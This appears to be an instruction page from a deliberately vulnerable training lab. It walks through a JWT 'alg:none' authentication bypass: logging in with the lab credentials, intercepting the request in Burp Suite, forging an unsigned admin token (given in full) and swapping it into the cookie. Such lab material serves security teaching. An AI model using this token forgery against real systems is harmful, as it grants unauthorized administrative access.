Attack Instructions — JWT alg:none Bypass

The vulnerable endpoint accepts JWTs with alg: "none". This means you can create a completely unsigned token and the server will accept it as valid.

1 Login with provided credentials
Use chirayu / chirayu123 to login and receive a valid JWT token.
2 Intercept the request in Burp Suite
Configure your browser's proxy to Burp Suite (127.0.0.1:8080). Navigate to the Vulnerable Admin page and intercept the request.
3 Understand the JWT structure
A JWT has 3 parts separated by dots: header.payload.signature
// Your current token header (base64url decoded):
{
  "alg": "HS256",
  "typ": "JWT"
}

// Your current token payload:
{
  "sub": "chirayu",
  "role": "user",
  "iat": 1234567890,
  "exp": 1234571490
}
4 Create a forged token with alg: "none"
  1. Change the header to: {"alg":"none","typ":"JWT"}
  2. Change the payload to: {"sub":"admin","role":"admin","iat":...,"exp":...}
  3. Base64url-encode both the header and payload
  4. Concatenate them with a dot, and add a trailing dot (empty signature): header.payload. 
// Forged header (base64url encode this):
{"alg":"none","typ":"JWT"}
→ eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0

// Forged payload (base64url encode this):
{"sub":"admin","role":"admin","iat":1234567890,"exp":9999999999}
→ eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTIzNDU2Nzg5MCwiZXhwIjo5OTk5OTk5OTk5fQ

// Final forged token (note the trailing dot, empty signature):
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTIzNDU2Nzg5MCwiZXhwIjo5OTk5OTk5OTk5fQ.
5 Replace the cookie and send the request
In Burp Suite Repeater or Intercept, replace the Cookie: token=... with your forged token. The server will accept it because it allows alg: "none".
